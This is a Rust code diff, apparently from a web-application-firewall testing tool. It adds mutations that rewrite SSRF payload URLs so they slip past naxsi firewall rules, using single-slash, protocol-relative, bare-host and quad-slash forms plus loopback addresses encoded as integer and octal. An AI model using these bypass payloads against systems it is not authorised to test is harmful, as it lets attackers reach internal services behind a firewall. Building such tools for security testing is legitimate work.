@@ -182,8 +182,50 @@ pub fn mutate(payload: &str) -> Vec<String> {
         add_with_suffix(&mut results, scheme, oob_domain, suffix);
     }
 
+    // ── Scheme-mangling for naxsi-class WAFs ─────────────────────────
+    // naxsi blocks `http://<IP>` as a unit. The following alt-forms
+    // pass cleanly while most URL parsers (Python urllib3, Java URL,
+    // Go net/url, libcurl) still normalise them to a working URL:
+    //
+    //   http:/X       — single slash (parsers fold to http://X)
+    //   //X           — protocol-relative (works against base://)
+    //   bare X        — no scheme (works for endpoints that prepend)
+    //   http:////X    — quad-slash (passes without normalisation)
+    //
+    // Live-confirmed against wafrift-bench naxsi for IPv4-as-integer
+    // and IPv4-as-octal (already in the address-encoding pass above).
+    let host_only = strip_scheme(payload).split('/').next().unwrap_or("").to_string();
+    if !host_only.is_empty() {
+        let path = extract_path(payload)
+            .map(|i| payload[i..].to_string())
+            .unwrap_or_else(|| "/".to_string());
+        for variant in [
+            format!("http:/{host_only}{path}"),       // single slash
+            format!("//{host_only}{path}"),           // protocol-relative
+            format!("{host_only}{path}"),             // bare host
+            format!("http:////{host_only}{path}"),    // quad-slash
+            // numeric forms with the alt schemes — naxsi already
+            // misses bare 2130706433 / 0x7f000001, so combine.
+            format!("//2130706433{path}"),            // protocol-relative + integer
+            format!("//0177.0.0.1{path}"),            // protocol-relative + octal
+        ] {
+            results.insert(variant);
+        }
+    }
+
     results.remove(payload);
     results.into_iter().collect()
+}
+
+/// Strip a leading `scheme://` (or `scheme:/`, `scheme:///`) from a URL.
+fn strip_scheme(s: &str) -> &str {
+    if let Some(i) = s.find("://") {
+        return &s[i + 3..];
+    }
+    if let Some(i) = s.find(":/") {
+        return &s[i + 2..];
+    }
+    s
 }
 
 /// Detect whether a payload looks like an SSRF URL or host reference.
